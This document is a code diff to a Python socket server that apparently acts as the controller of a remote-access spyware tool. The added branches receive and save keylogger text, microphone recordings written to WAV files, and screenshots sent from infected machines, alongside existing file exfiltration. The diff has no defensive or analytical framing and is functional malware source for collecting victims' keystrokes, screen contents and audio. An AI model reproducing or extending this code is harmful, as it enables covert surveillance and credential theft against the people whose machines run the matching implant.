@@ -1,6 +1,9 @@
 import socket
 import threading
 import time
+from PIL import Image
+import io
+import wave
 
 class App:
     def __init__(self):
@@ -65,12 +68,13 @@ class App:
                             recv_file += chunk
                             print(f"received {len(recv_file)}/{int(header[2])} bytes")
                             
-                        with open(f"received_{header[1]}", "wb") as f:
+                        name = f"ressources/files/file_{header[1]}"
+                        with open(name, "wb") as f:
                             f.write(recv_file)                          
                             
                             
-                        print(f"filed saved as : received_{header[1]}")
-                        new_logs += f"filed saved as : received_{header[1]} \n"
+                        print(f"filed saved as : {name}")
+                        new_logs += f"filed saved as : {name} \n"
                     except Exception as e:
                         print("error while downloading file : ", e)
                         new_logs += "error while downloading file : " + str(e) + "\n"
@@ -89,15 +93,65 @@ class App:
                         
                         name = "ressources/screenshots/screenshot_" + str(time.time()) + ".png"
                         
-                        with open(name, "wb") as f:
-                            f.write(img_data)
+                        if header[2] == "BYTES":
+                            with open(name, "wb") as f:
+                                f.write(img_data)
+                        elif header[2] == "PIL":
+                            img = Image.open(io.BytesIO(img_data))
+                            img.save(name)
                         
                         print("screenshot received and saved as ", name)
+                        print("the screenshot size is ", header[1], " bytes")
                         new_logs += "screenshot received and saved as " + name + "\n"
+                        new_logs += "the screenshot size is " + str(header[1]) + " bytes"
                     except Exception as e:
                         print("error while downloading screenshot : ", e)
                         new_logs += "error while downloading screenshot : " + str(e) + "\n"
                         
+                elif recv_header.startswith("TEXTFILE"):
+                    try:
+                        header = recv_header.split(":")
+                        print("receiving text file containing keylogger informations ...")
+
+                        data = client.recv(4096).decode("utf-8")
+                            
+                        name = f"ressources/keylogger/keylogger_" + str(time.time()) + ".txt"
+                        with open(name, "w") as f:
+                            f.write(data)
+                            
+                        print(f"keylogger informations saved as : ", name)
+                        new_logs += f"keylogger informations saved as : {name} \n"
+                    except Exception as e:
+                        print("error while downloading keylogger informations : ", e)
+                        new_logs += "error while downloading keylogger informations : " + str(e) + "\n"
+
+                elif recv_header.startswith("AUDIO"):
+                    try:
+                        header = recv_header.split(":")
+                        print(f"receiving file with size : {header[1]}")
+                        
+                        audio_data = b""
+                        while len(audio_data) < int(header[1]):
+                            chunk = client.recv(4096)
+                            if not chunk:
+                                break
+                            audio_data += chunk
+                            print(f"received {len(audio_data)}/{int(header[1])} bytes")
+                            
+                        name = f"ressources/audio/microphone_{header[1]}" + ".wav"
+
+                        wf = wave.open(name, 'wb')
+                        wf.setnchannels(1)
+                        wf.setsampwidth(2)
+                        wf.setframerate(44100)
+                        wf.writeframes(audio_data)
+                        wf.close()
+                        print(f"microphone informations saved as : ", name)
+                        new_logs += f"microphone informations saved as : {name} \n"
+                    except Exception as e:
+                        print("error while downloading microphone informations : ", e)
+                        new_logs += "error while downloading microphone informations : " + str(e) + "\n"
+
                 else:
                     msg = client.recv(4096).decode()
                     print(msg)
